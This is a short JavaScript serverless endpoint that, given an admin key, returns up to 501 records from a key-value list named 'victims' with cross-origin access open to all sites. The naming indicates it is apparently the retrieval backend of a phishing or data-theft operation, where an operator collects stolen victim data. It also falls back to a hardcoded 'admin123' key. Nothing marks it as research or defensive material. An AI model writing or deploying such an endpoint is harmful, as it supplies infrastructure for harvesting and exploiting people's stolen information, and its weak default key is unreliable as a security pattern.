import { kv } from '@vercel/kv';

const ADMIN_KEY = process.env.ADMIN_KEY || 'admin123';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.query.key !== ADMIN_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    try {
        const victims = await kv.lrange('victims', 0, 500);
        const parsed = victims.map(v => {
            try { return JSON.parse(v); } catch { return { raw: v }; }
        });
        
        return res.status(200).json(parsed);
    } catch (e) {
        return res.status(500).json({ error: e.message });
    }
}
